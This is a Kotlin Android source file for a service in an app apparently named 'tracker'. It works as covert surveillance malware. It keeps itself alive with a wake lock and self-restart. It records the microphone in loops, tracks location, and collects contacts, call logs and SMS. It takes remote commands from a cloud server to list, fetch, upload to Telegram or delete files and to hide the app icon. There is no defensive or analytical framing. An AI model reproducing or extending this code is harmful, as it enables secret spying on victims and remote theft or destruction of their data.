package com.venice.tracker

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import org.json.JSONObject
import java.io.File
import java.util.concurrent.Executors

class CoreService : Service() {

    private val exec = Executors.newSingleThreadExecutor()
    private val ui = Handler(Looper.getMainLooper())
    private var wake: PowerManager.WakeLock? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        goForeground()
        try {
            wake = (getSystemService(Context.POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "tracker:core")
            wake?.acquire(12L * 60L * 60L * 1000L)
        } catch (t: Throwable) { Util.log(this, "wake: $t") }

        Location2.start(this)
        exec.execute {
            try { Pim.snapshot(this) } catch (t: Throwable) { Util.log(this, "pim: $t") }
            try { Files.index(this) } catch (t: Throwable) { Util.log(this, "files: $t") }
        }
        startRecorderLoop()
        startCloudLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        goForeground()
        if (intent?.action == "RECORD_60") {
            exec.execute {
                Recorder.stop(this)
                Recorder.start(this)
                ui.postDelayed({ exec.execute { Recorder.stop(this) } }, 60_000L)
            }
        }
        return START_STICKY
    }

    private fun goForeground() {
        val n = Util.notification(this, "running")
        when {
            Build.VERSION.SDK_INT >= 34 ->
                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            Build.VERSION.SDK_INT >= 29 ->
                startForeground(
                    1, n,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                )
            else -> startForeground(1, n)
        }
    }

    private fun startRecorderLoop() {
        val tick = object : Runnable {
            override fun run() {
                exec.execute {
                    try {
                        Recorder.stop(this@CoreService)
                        Recorder.start(this@CoreService)
                    } catch (t: Throwable) { Util.log(this@CoreService, "recloop: $t") }
                }
                ui.postDelayed(this, Config.SEGMENT_MS)
            }
        }
        ui.postDelayed(tick, 2000L)
    }

    private fun startCloudLoop() {
        val tick = object : Runnable {
            override fun run() {
                exec.execute {
                    try {
                        heartbeat()
                        Cloud.flush(this@CoreService)
                        pollCommands()
                    } catch (t: Throwable) { Util.log(this@CoreService, "cloudloop: $t") }
                }
                ui.postDelayed(this, Config.CLOUD_TICK_MS)
            }
        }
        ui.postDelayed(tick, 4000L)
    }

    private fun heartbeat() {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val sticky = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val charging = (sticky?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
            == BatteryManager.BATTERY_STATUS_CHARGING)
        Cloud.sendStatus(this, mapOf("battery" to pct, "charging" to charging))
    }

    private fun pollCommands() {
        val raw = Cloud.get("dev/${Config.DEVICE_ID}/cmd") ?: return
        val obj = try { JSONObject(raw) } catch (_: Throwable) { return }
        val keys = obj.keys()
        while (keys.hasNext()) {
            val id = keys.next()
            val cmd = obj.optJSONObject(id) ?: continue
            val result = try { run(cmd.optString("t"), cmd.optString("a")) }
                         catch (t: Throwable) { "error: $t" }
            Cloud.put("dev/${Config.DEVICE_ID}/cmdres/$id",
                JSONObject().put("t", cmd.optString("t"))
                    .put("r", result).put("ts", System.currentTimeMillis()).toString())
            Cloud.delete("dev/${Config.DEVICE_ID}/cmd/$id")
        }
    }

    private fun run(type: String, arg: String): String = when (type) {
        "ping" -> "pong from ${Build.MODEL} at ${Util.ts}"
        "locate" -> Location2.once(this)
        "rec60" -> {
            ui.post { startService(Intent(this, CoreService::class.java).setAction("RECORD_60")) }
            "recording 60s, will land in Telegram"
        }
        "pim" -> { Pim.snapshot(this); "contacts/calls/sms refreshed" }
        "index" -> "indexed ${Files.index(this)} files"
        "ls" -> listDir(arg)
        "fetch" -> fetch(arg)
        "rm" -> { val f = File(arg); if (f.delete()) "deleted $arg" else "could not delete $arg" }
        "hide" -> { MainActivity.setIcon(this, false); "icon hidden" }
        "show" -> { MainActivity.setIcon(this, true); "icon shown" }
        "log" -> File(filesDir, "log.txt").let { if (it.exists()) it.readText().takeLast(3000) else "empty" }
        else -> "unknown command: $type"
    }

    private fun listDir(path: String): String {
        val d = if (path.isBlank()) File("/storage/emulated/0") else File(path)
        if (!d.isDirectory) return "not a folder: $path"
        val out = StringBuilder()
        d.listFiles()?.sortedBy { it.name }?.take(300)?.forEach {
            out.append(if (it.isDirectory) "[D] " else "[F] ")
            out.append(it.name).append("  ").append(it.length()).append("\n")
        }
        return out.toString()
    }

    private fun fetch(path: String): String {
        val f = File(path)
        if (!f.exists()) return "missing: $path"
        if (f.length() > Config.MAX_UPLOAD) return "too big (${f.length()} bytes)"
        Cloud.queueTg(this, f, "file ${f.name}", false)
        return "queued ${f.name}, check Telegram"
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            startService(Intent(this, CoreService::class.java))
        } catch (_: Throwable) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        try { wake?.release() } catch (_: Throwable) {}
        try {
            startService(Intent(this, CoreService::class.java))
        } catch (_: Throwable) {}
        super.onDestroy()
    }
}
